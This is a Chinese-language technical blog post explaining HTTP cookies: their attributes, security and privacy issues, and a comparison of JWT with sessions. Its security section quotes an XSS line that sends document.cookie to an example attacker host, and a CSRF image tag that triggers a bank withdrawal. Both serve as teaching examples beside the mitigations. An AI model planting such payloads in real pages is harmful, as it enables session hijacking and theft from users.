title: cookies 深入理解
date: 2019-01-21 11:14:47
tags: base
categories: 技术
comment: true

### cookies起源

早期Web开发面临的最大问题之一是如何管理状态。简言之，服务器端没有办法知道两个请求是否来自于同一个浏览器。那时的办法是在请求的页面中插入一个token，并且在下一次请求中将这个token返回（至服务器）。这就需要在form中插入一个包含token的隐藏表单域，或着在URL的qurey字符串中传递该token。这两种办法都强调手工操作并且极易出错。

​	**LouMontulli** 那时是网景通讯的一个雇员，被认为在1994年将“**magic cookies**”的概念应用到了web通讯中。他意图解决的是web中的购物车，现在所有购物网站都依赖购物车。他的最早的说明文档提供了一些cookies工作原理的基本信息该文档在**RFC2109**中被规范化（这是所有浏览器实现cookies的参考依据），并且最终逐步形成了**REF2965**.**Montulli**最终也被授予了关于cookies的美国专利。网景浏览器在它的第一个版本中就开始支持cookies，并且当前所有web浏览器都支持cookies。

### cookie是什么

​       坦白的说，一个cookie就是存储在用户主机浏览器中的一小段文本文件。Cookies是纯文本形式，它们不包含任何可执行代码。一个Web页面或服务器告之浏览器来将这些信息存储并且基于一系列规则在之后的每个请求中都将该信息返回至服务器。Web服务器之后可以利用这些信息来标识用户。多数需要登录的站点通常会在你的认证信息通过后来设置一个cookie，之后只要这个cookie存在并且合法，你就可以自由的浏览这个站点的所有部分。再次，cookie只是包含了数据，就其本身而言并不有害。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。

### cookie 的作用

Cookie主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API（本地存储和会话存储）或 IndexedDB。

### cookie 创建

当服务器收到HTTP请求时，服务器可以在响应头里面添加一个`Set-Cookie`选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过`Cookie`请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

```Set-Cookie: value [ ;expires=date][ ;domain=domain][ ;path=path][ ;secure][ ;httponly][;samesite=strict]```

消息头的第一部分，value部分，通常是一个name=value格式的字符串。事实上，原始手册指示这是应该使用的格式，但是浏览器对cookie的所有值并不会按此格式校验。实际上，你可以指定一个不包含等号的字符串并且它同样会被存储。然而，通常性的使用方式是以name=value的格式（并且多数的接口只支持该格式）来指定cookie的值。

- **name**: 可以是除了控制字符 (CTLs)、空格 (spaces) 或制表符 (tab)之外的任何 US-ASCII 字符。同时不能包含以下分隔字符： ( ) < > @ , ; : \ " /  [ ] ? = { }.
- **value**: 是可选的，如果存在的话，那么需要包含在双引号里面。支持除了控制字符（CTLs）、空格（whitespace）、双引号（double quotes）、逗号（comma）、分号（semicolon）以及反斜线（backslash）之外的任意 US-ASCII 字符。**关于编码**：许多应用会对 cookie 值按照URL编码（URL encoding）规则进行编码，但是按照 RFC 规范，这不是必须的。不过满足规范中对于 <cookie-value> 所允许使用的字符的要求是有用的。

当一个cookie存在，并且可选条件允许的话，该cookie的值会在接下来的每个请求中被发送至服务器。cookie的值被存储在名为Cookie的HTTP消息头中，并且只包含了cookie的值，其它的选项全部被去除。

```Cookie : name=value```

通过Set-Cookie指定的选项只是应用于浏览器端，一旦选项被设置后便不会被服务器重新取回。cookie的值与Set-Cookie中指定的值是完全一样的字符串；对于这些值不会有更近一步的解析或转码操作。如果在指定的请求中有多个cookies，那么它们会被分号和空格分开，例如：

```Cookie:name=value1 ; name=value2 ; name1=value1```

**cookie**中**value**的大小以及数量的限制，详情查看<http://browsercookielimits.squawky.net>

下面是两个特殊的 name 前缀：

- **__Secure- 前缀**：以 __Secure- 为前缀的 cookie（其中连接符是前缀的一部分），必须与 secure 属性一同设置，同时必须应用于安全页面（即使用 HTTPS 访问的页面）。（对于不支持的客服端，无法保证）
- **__Host- 前缀：** 以 __Host- 为前缀的 cookie，必须与 secure 属性一同设置，必须应用于安全页面（即使用 HTTPS 访问的页面），必须不能设置 domain 属性 （也就不会发送给子域），同时 path 属性的值必须为“/”。（对于不支持的客服端，无法保证）

#### Expires和Max-Age 选项

- `Expires` 为 Cookie 的删除设置一个过期的**日期**
- `Max-age` 设置一个 Cookie 将要过期的**秒数**

如果两个参数都不设定，又叫 session Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（`Expires`）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。

与上面相反的就是，持久性Cookie可以指定一个特定的过期时间（`Expires`）或有效期（`Max-Age`）。当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

**同时设定expires 和 max-age**所有支持 `max-age` 的浏览器会忽略 `expires` 的值，只有 IE 另外，IE 会忽略 `max-age` 只支持 `expires`；**如果我只设了 max-age**，除了 IE 之外的所有浏览器会正确的使用它。在 IE 浏览器中，这个 Cookie 将会作为一个 Session Cookie（当你关闭浏览器时它会被删除）；**如果我只设了 expires**，所有浏览器会正确使用它来保存 Cookie，只需要记得像上边示例那样设置它的 GMT 时间就行了。

如果maxAge为负数，则表示该Cookie仅在本浏览器窗口以及本窗口打开的子窗口内有效，关闭窗口后该Cookie即失效。maxAge为负数的Cookie，为临时性Cookie，不会被持久化，不会被写到Cookie文件中。Cookie信息保存在浏览器内存中，因此关闭浏览器该Cookie就消失了。Cookie默认的maxAge值为-1。

如果maxAge为0，则表示删除该Cookie。Cookie机制没有提供删除Cookie的方法，因此通过设置该Cookie即时失效实现删除Cookie的效果。失效的Cookie会被浏览器从Cookie文件或者内存中删除，

总结：为了兼容更多的浏览器，设定 expires 来持久化 cookies

#### Domain 选项

指示cookie将要发送到哪个域或哪些域中。默认情况下，**domain**会被设置为创建该cookie的页面所在的域名,并且只能当前页面的域名可以访问 cookie, 相应的子域名都不行访问该 cookie。而**domain**选项被用来扩展cookie值所要发送域的数量。

如果指定了`Domain`，则一般包含子域名。浏览器会对domain的值与请求所要发送至的域名，做一个尾部比较（即从字符串的尾部开始比较），并且在匹配后发送一个Cookie消息头。 domain设置的值必须是发送Set-Cookie消息头的域名

例如，如果设置 `Domain=laowang.com`，则Cookie也包含在子域名中（如`developer.laowang.com`,`test.developer.laowang.com`）

#### Path选项

​       另一个控制何时发送Cookie消息头的方式是指定path选项。与domain选项相同的是，path指明了在发Cookie消息头之前必须在请求资源中存在一个URL路径。这个比较是通过将path属性值与请求的URL从头开始逐字符串比较完成的。如果字符匹配在这个例子中，Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

要注意的是只有在domain选项核实完毕之后才会对path属性进行比较。path属性的默认值是发送Set-Cookie消息头所对应的URL中的path部分。

#### Secure选项

该选项只是一个标记并且没有其它的值。一个secure cookie只有当请求是通过SSL和HTTPS创建时，才会发送到服务器端。这种cookie的内容意指具有很高的价值并且可能潜在的被破解以纯文本形式传输，现实中，机密且敏感的信息绝不应该在cookie中存储或传输，因为cookies的整个机制都是原本不安全的。默认情况下，在HTTPS链接上传输的cookies都会被自动添加上secure选项，不安全的站点（`http:`）无法使用Cookie的 `Secure` 标记。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）已经不能再在 cookie 中设置 "secure"  指令了。

#### HTTP-Only选项

HTTP-Only背后的意思是告之浏览器该cookie绝不应该通过Javascript的document.cookie属性访问。设计该特征意在提供一个安全措施来帮助阻止通过Javascript发起的跨站脚本攻击(XSS)窃取cookie的行为 一旦设定这个标记，通过documen.coookie则不能再访问该cookie。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 `HttpOnly` 标记。你也不能通过JavaScript设置HTTP-only cookies，因为你不能再通过JavaScript读取这些cookies。

#### SameSite选项

`SameSite` Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击**CSRF**。但目前`SameSite` Cookie还处于实验阶段，并不是所有浏览器都支持。

**SameSite=Strict**：

严格模式，表明这个 cookie 在任何情况下都不可能作为第三方 cookie，绝无例外。比如说假如 b.com 设置了如下 cookie：

```
Set-Cookie: foo=1; SameSite=Strict
Set-Cookie: bar=2
```

你在 a.com 下发起的对 b.com 的任意请求中，foo 这个 cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 cookie 被设置成了 SameSite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 cookie，其它网站发起的对淘宝的任意请求都不会带上那个 cookie。

**SameSite=Lax**：

宽松模式，比 Strict 放宽了点限制：假如这个请求是我上面总结的那种同步请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求（因为从语义上说 GET 是读取操作，比 POST 更安全），则这个 cookie 可以作为第三方 cookie。比如说假如 b.com 设置了如下 cookie：

```
Set-Cookie: foo=1; SameSite=Strict
Set-Cookie: bar=2; SameSite=Lax
Set-Cookie: baz=3
```

当用户从 a.com 点击链接进入 b.com 时，foo 这个 cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。

![image-20190109143109759.png](https://github.com/leolinf/hexo-blog/blob/master/source/_posts/images/image-20190109143109759.png?raw=true)

### 安全

##### 会话劫持和 xss(跨站脚本攻击)

在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)攻击。

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly`类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

##### 跨站请求伪造（CSRF）

已经给了一个比较好的[CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)；
- 任何敏感操作都需要确认；
- 用于敏感信息的Cookie只能拥有较短的生命周期；等等

### 追踪和隐私

##### 第三方Cookie

每个Cookie都会有与之关联的域（Domain），如果Cookie的域和页面的域相同，那么我们称这个Cookie为*第一方Cookie*（*first-party cookie*），如果Cookie的域和页面的域不同，则称之为*第三方Cookie*（*third-party cookie*.）。一个页面包含图片或存放在其他域上的资源（如图片广告）时，第一方的Cookie也只会发送给设置它们的服务器。通过第三方组件发送的第三方Cookie主要用于广告和网络追踪。这方面可以看谷歌使用的Cookie类型（[types of cookies used by Google](https://www.google.com/policies/technologies/types/)）。大多数浏览器默认都允许第三方Cookie，但是可以通过附加组件来阻止第三方Cookie（如[EFF](https://www.eff.org/)的[Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/)）。
如果你没有公开你网站上第三方Cookie的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子[cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement)。

##### 禁止追踪Do-Not-Track

虽然并没有法律或者技术手段强制要求使用[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)，但是通过[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)以获取更多信息。

##### 欧盟Cookie指令

关于Cookie，欧盟已经在[2009/136/EC指令](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136)中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。
该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的Cookie将用于何处。
可以通过[维基百科的相关内容](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)获取最新的各国法律和更精确的信息。

##### 僵尸Cookie和删不掉的Cookie

Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类Cookie较难以删除，甚至删除之后会自动重建。它们一般是使用[Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)、Flash本地共享对象或者其他技术手段来达到的。

### JWT和 SESSION 对比

JWT是一种无状态的鉴权机制。将用户登录后的一些信息（比如用户Id）和过期时间等信息存储在一个加密过的字符串中,当服务器收到请求的时候，进行解密并直接使用信息
 JWT的组成：使用base64编码描述jwt的头部、使用base64编码的payload、以及加密签名
 缺点，服务器无法像session一样方便地管理用户登录状态

JWT认证流程：

![image-20190117154201742.png](https://github.com/leolinf/hexo-blog/blob/master/source/_posts/images/image-20190117154201742.png?raw=true)

session 认证流程：

![image-20190117161532326](https://github.com/leolinf/hexo-blog/blob/master/source/_posts/images/image-20190117161532326.png?raw=true)

**1.可伸缩性：**随着应用程序的增长和用户群的增加，您必须水平或垂直开始扩展。 会话数据通过文件或数据库存储在服务器的内存中。 在水平扩展方案中，您必须开始复制服务器，您必须提供一个单独的中央会话存储系统，您的所有应用程序服务器都可以访问该系统。 否则，由于会话存储缺陷，您将无法扩展应用程序。 解决这一挑战的另一种方法是使用[粘性会话]的概念。 您还可以将会话存储在磁盘上，以便在云环境中轻松扩展应用程序。 这些类型的变通办法并不能很好地适应现代大型应用程序。 建立和维护这种类型的分布式系统涉及深入的技术知识，并随后导致更高的财务成本。 在这种情况下，使用JWT是无缝的; 由于基于令牌的身份验证是无状态的，因此无需在会话中存储用户信息。 我们的应用程序可以轻松扩展，因为我们可以使用令牌来访问来自不同服务器的资源，而无需担心用户是否实际登录到特定服务器。 您还可以节省成本，因为您不需要专用服务器来存储会话。 为什么？ 因为没有会话！

**注意：**如果您正在构建绝对不需要扩展到在多个服务器上运行且不需要RESTful API的小型应用程序，那么会话肯定适合您。 如果您可以使用专用服务器为会话存储运行Redis等工具，那么会话也可能完美适合您！

**2. RESTful API服务：**现代应用程序的一种常见模式是从RESTful API检索和使用JSON数据。 如今，大多数应用程序都有RESTful API供其他开发人员或应用程序使用。 从API提供数据有几个明显的优点，其中之一就是能够在多个应用程序中使用数据。 在这种情况下，将会话和cookie用于用户身份的传统方法效果不佳，因为它们将**状态**引入应用程序。

RESTful API的原则之一是它应该是无状态的，这意味着当发出请求时，总是可以预期某些参数内的响应而没有副作用。 用户的身份验证状态引入了这样的副作用，这违反了这一原则。 保持API无状态，因此没有副作用意味着可维护性和调试变得更加容易。

这里的另一个挑战是，从一个服务器提供API并且实际应用程序从另一个服务器使用API是很常见的。 为实现这一目标，我们需要启用跨源资源共享（CORS） 。 由于cookie只能用于它们所源自的域，因此它们对不同域上的API的帮助不大于应用程序。 在这种情况下使用JWT进行身份验证可确保RESTful API无状态，您也不必担心API或应用程序的提供位置！

**3.表现：**对此进行批判性分析是非常必要的。 当从客户端向服务器发出请求时，如果在JWT中编码了大量数据，则会对每个HTTP请求产生大量开销。 但是，对于会话，只有很少的开销，因为**SESSION ID**实际上非常小。

编码时，JWT的大小将是**SESSION ID（标识符）**大小的几倍，因此，对于每个HTTP请求，此JWT会增加比**SESSION ID**更多的开销。 对于会话，还有一个服务器端查找，用于在每个请求上查找和反序列化会话。

JWT通过将数据保留在客户端来交换延迟的大小。 应用程序的数据模型是一个重要因素，因为通过防止对服务器上的数据库进行不间断的调用和查询来节省延迟。 这里的想法是小心不要在JWT中存储太多的声明，以避免巨大的，过度膨胀的请求。

值得一提的是令牌可能需要访问后端的数据库。 刷新令牌尤其如此。 他们可能需要访问授权服务器上的数据库以进行黑名单。 获取有关刷新令牌以及何时使用它们的更多信息。 

**4.安全：**签署JWT已经旨在防止客户端的篡改，但也可以加密它们以确保令牌携带的声明非常安全。 现在，JWT大多数直接存储在Web存储（本地/会话存储）或cookie中。 JavaScript可以访问同一个域中的Web存储。 这仅仅意味着您的JWT可能容易受到XSS（跨站点脚本）的攻击。 可以在页面上嵌入恶意JavaScript，以读取和破坏Web存储的内容。 事实上，很多人提倡由于XSS攻击，非常敏感的数据不应该存储在Web存储中。 一个非常典型的示例是确保您的JWT不使用非常敏感/可信的数据进行编码，例如用户的社会安全号码。

最初，我提到JWT可以存储在cookie中。 实际上，JWT在很多场合都存储为cookie，并且cookie容易受CSRF（跨站点请求伪造）攻击。 防止CSRF攻击的众多方法之一是确保您的cookie只能由您的域访问。 作为开发人员，无论JWT的使用如何，都要确保采取必要的CSRF保护措施以避免这些攻击。

现在，JWT和会话ID也可以暴露给未经重复的重播攻击。 完全由开发人员来确定适合其系统的重放缓解技术。 解决此问题的一种方法是确保JWT依赖于短暂的到期时间。

**注意** ：使用HTTPS / SSL确保在客户端和服务器传输期间默认加密cookie和JWT。 这有助于避免中间人攻击！